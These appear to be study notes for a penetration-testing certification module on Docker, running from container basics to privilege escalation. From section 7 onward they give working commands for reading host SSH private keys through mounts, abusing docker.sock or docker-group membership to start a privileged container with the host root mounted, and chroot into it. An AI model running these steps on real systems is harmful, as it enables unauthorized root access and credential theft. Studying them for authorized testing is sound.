## 1. What Is Docker?

**Docker** is an open-source platform that provides a portable and consistent runtime environment using containers.

Containers:

- Run at the operating-system level
    
- Share system resources
    
- Isolate applications
    
- Use fewer resources than traditional VMs
    
- Package application code, dependencies, libraries, and configuration
    

### Basic architecture

```text
HOST SYSTEM
┌─────────────────────────────────────┐
│             OS / Kernel             │
│                                     │
│  ┌──────────┐      ┌──────────┐   │
│  │Container │      │Container │   │
│  │    A     │      │    B     │   │
│  └──────────┘      └──────────┘   │
│                                     │
└─────────────────────────────────────┘
```

---

# 2. Docker Architecture

Docker follows a **client-server model**.

Two primary components:

```text
Docker Client
      │
      │ commands
      ↓
Docker Daemon
      │
      ├── Creates containers
      ├── Runs containers
      ├── Stops containers
      ├── Manages images
      └── Manages resources
```

The Docker client communicates with the Docker daemon through a **RESTful API or Unix socket**.

---

# 3. Docker Daemon

The **Docker Daemon** is responsible for managing Docker on the host.

Responsibilities include:

- Running containers
    
- Interacting with containers
    
- Creating/executing/monitoring containers
    
- Managing Docker images
    
- Networking
    
- Storage/volumes
    
- Logging
    
- Resource monitoring
    

### Think of it as:

```text
Docker Client
     │
     │ "run this container"
     ↓
Docker Daemon
     │
     ↓
Actually performs the operation
```

---

# 4. Docker Client

The **Docker Client** is the interface we use to interact with Docker.

Examples:

```bash
docker ps
docker run
docker exec
docker image ls
docker stop
docker rm
```

The client sends commands to the daemon, which performs the requested actions.

---

# 5. Docker Compose

**Docker Compose** manages multiple containers as a single application.

It uses:

```text
.yaml
.yml
```

configuration files.

A Compose file can define:

- Services
    
- Dependencies
    
- Images
    
- Environment variables
    
- Networking
    
- Volume bindings
    
- Other container settings
    

```text
docker-compose.yml
        │
        ├── Web
        ├── Database
        └── API
             ↓
       Multiple containers
```

---

# 6. Docker Image vs Container

## Docker Image

An **image** is a blueprint/template for creating containers.

It contains:

- Application code
    
- Dependencies
    
- Libraries
    
- Configuration
    
- Runtime requirements
    

Images are **read-only/immutable**.

```text
IMAGE
  │
  │ docker run
  ↓
CONTAINER
```

## Docker Container

A container is an **instance of an image**.

It is:

- Lightweight
    
- Isolated
    
- Executable
    
- Mutable during runtime
    

### Easy memory trick

```text
Image     = Blueprint
Container = Running instance
```

---

# 7. Docker Privilege Escalation

This is the important CPTS section.

If a low-privileged user can **manage Docker containers**, Docker may provide a path to higher privileges.

Core concept:

```text
Low-privileged user
        │
        ↓
Docker access
        │
        ↓
Control Docker daemon
        │
        ↓
Create privileged container
        │
        ↓
Mount host filesystem
        │
        ↓
Host access
```

---

# 8. Docker Shared Directories / Volumes

Docker can map directories between:

```text
HOST
  ↕
CONTAINER
```

These are called **volume mounts/shared directories**.

For example:

```text
Host:
/home/user

       ↕ mount

Container:
/hostsystem
```

The container can then access the host directory through `/hostsystem`.

---

# 9. Read-Only vs Read-Write Mounts

Shared directories can be:

```text
Read-only
```

or:

```text
Read-write
```

### Read-only

```text
Container → Host
     READ
      ↓
     ✓
     WRITE
      ↓
     ✗
```

### Read-write

```text
Container ↔ Host
     READ
     WRITE
```

Read-only mounts help prevent modifications to host files.

---

# 10. Shared Directory PrivEsc

The module demonstrates a container with:

```text
/hostsystem
```

mapped to a host directory.

Inside the container:

```bash
cd /hostsystem/home/cry0l1t3
```

The user can see:

```text
.bash_history
.ssh/
```

and:

```bash
cat .ssh/id_rsa
```

This exposes the user's private SSH key.

### Attack chain

```text
Container access
      ↓
Host directory mounted
      ↓
/hostsystem/home/user
      ↓
.ssh/id_rsa
      ↓
Private SSH key
      ↓
Potential host login
```

The module then demonstrates using the recovered key:

```bash
ssh cry0l1t3@<host IP> -i cry0l1t3.priv
```

---

# 11. Docker Socket

A **Docker socket** allows processes to communicate with the Docker daemon.

A common location is:

```text
/var/run/docker.sock
```

It can also exist elsewhere.

The Docker client communicates with the daemon through this socket.

```text
Docker CLI
    │
    ↓
docker.sock
    │
    ↓
Docker Daemon
    │
    ↓
Containers
```

---

# 12. Why Docker Socket Access Is Dangerous

Access to the Docker socket effectively means access to the Docker daemon.

If an attacker can control the daemon, they may be able to create containers with powerful configurations.

The module shows a socket at:

```text
/app/docker.sock
```

with:

```text
srw-rw---- 1 root root ... docker.sock
```

---

# 13. Interacting With a Docker Socket

The module uses:

```bash
/tmp/docker -H unix:///app/docker.sock ps
```

The `-H` option specifies the Docker daemon endpoint.

```text
-H unix:///app/docker.sock
       │
       └── Use this Unix socket
```

This can be used to enumerate running containers.

---

# 14. Privileged Docker Container

The module demonstrates creating a container with:

```text
--privileged
```

and mounting:

```text
/:/hostsystem
```

The important conceptual command is:

```bash
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
```

Breakdown:

```text
--privileged
     ↓
Privileged container

-v /:/hostsystem
     ↓
Host / mounted at container /hostsystem
```

Therefore:

```text
HOST /
   │
   ↓
CONTAINER /hostsystem
```

---

# 15. Entering the Privileged Container

The module then enters the newly created container:

```bash
/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
```

Inside:

```bash
cat /hostsystem/root/.ssh/id_rsa
```

This provides access to the host's root SSH private key if present.

### Attack chain

```text
Docker socket access
        ↓
Control Docker daemon
        ↓
Create privileged container
        ↓
Mount host /
        ↓
/hostsystem
        ↓
Host /root
        ↓
Sensitive files / SSH keys
        ↓
Host access
```

---

# 16. Docker Group

Check group membership with:

```bash
id
```

Example:

```text
uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

The important part:

```text
groups=...,docker
             ↑
```

A user in the **`docker` group** can use and control the Docker daemon.

### CPTS red flag

```text
id
 ↓
docker group
 ↓
Investigate Docker PrivEsc
```

---

# 17. Other Ways Docker May Be Privileged

The module identifies three situations that can provide Docker-based privilege escalation:

```text
1. User is in docker group
2. Docker binary has SUID
3. Sudoers permits running docker as root
```

So don't only check:

```bash
id
```

Also consider:

```bash
sudo -l
```

and SUID enumeration:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

---

# 18. Enumerate Docker Images

If Docker access exists:

```bash
docker image ls
```

Example:

```text
REPOSITORY   TAG     IMAGE ID
ubuntu       20.04   20fffa419e3a
```

Also useful:

```bash
docker ps
```

to see running containers.

---

# 19. Docker Socket Writable

Another important scenario:

```text
Docker socket is writable
```

Even if the current user isn't in:

```text
docker
```

or:

```text
root
```

a writable Docker socket may still provide access to the daemon.

The module notes that the socket is normally restricted to root/docker-group access, but a misconfigured writable socket can create a privilege-escalation path.

---

# 20. Host Filesystem Through Docker

The module demonstrates:

```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

The critical piece is:

```text
-v /:/mnt
```

Meaning:

```text
Host /
  ↓
Container /mnt
```

Then:

```text
chroot /mnt
```

changes the apparent root directory to the mounted host filesystem.

The result is access to the host filesystem from the container.

---

# 21. Docker PrivEsc Decision Tree

```text
                 Docker discovered
                        │
                        ↓
                      id
                        │
             ┌──────────┴──────────┐
             ↓                     ↓
       docker group?          Not in group
             │                     │
            YES                    ↓
             │              Check docker.sock
             ↓                     │
      Docker daemon               ↓
       control?              Writable/access?
             │                     │
             ↓                     ↓
     Privileged container     Docker daemon
             │                     │
             └──────────┬──────────┘
                        ↓
                  Mount host /
                        ↓
                  Host filesystem
                        ↓
                    PrivEsc
```

---

# 22. LXC/LXD vs Docker

You've now covered two major container-based PrivEsc paths.

|LXC/LXD|Docker|
|---|---|
|`lxd` / `lxc` group|`docker` group|
|LXD daemon|Docker daemon|
|`lxc` commands|`docker` commands|
|Privileged container|`--privileged` container|
|Mount host `/`|Mount host `/`|
|Host filesystem access|Host filesystem access|

### Memory trick

```text
LXD
 ↓
lxd group
 ↓
Privileged container
 ↓
Host /

Docker
 ↓
docker group/socket
 ↓
Privileged container
 ↓
Host /
```

---

# 🔥 CPTS Must-Know

## Docker enumeration

```bash
id
```

Look for:

```text
docker
```

Check Docker:

```bash
docker ps
```

```bash
docker image ls
```

Check sudo:

```bash
sudo -l
```

Check socket:

```bash
ls -la /var/run/docker.sock
```

The socket may also be located elsewhere.

---

## Critical Docker PrivEsc Indicators

```text
docker group
     ↓
Docker daemon access
```

```text
Writable docker.sock
     ↓
Docker daemon access
```

```text
sudo docker ...
     ↓
Potential privileged Docker access
```

```text
SUID docker
     ↓
Investigate
```

```text
--privileged
     ↓
Highly privileged container
```

```text
-v /:/hostsystem
     ↓
Host root filesystem exposed
```

---

# 🧠 Final Revision Card

```text
DOCKER PRIVESC
════════════════════════════════════

1. id
      ↓
   docker group?

2. Check Docker access
      ↓
   docker ps
   docker image ls

3. Check socket
      ↓
   /var/run/docker.sock
   or another socket location

4. If daemon is controllable
      ↓
   Can privileged container be created?

5. Host filesystem mount
      ↓
   -v /:/hostsystem

6. Host filesystem accessible
      ↓
   /hostsystem/etc
   /hostsystem/home
   /hostsystem/root
   etc.

7. Potential host compromise
```

### 🔑 One-line CPTS memory trick

**`docker` group/socket access → control Docker daemon → privileged container → mount host `/` → host filesystem access.**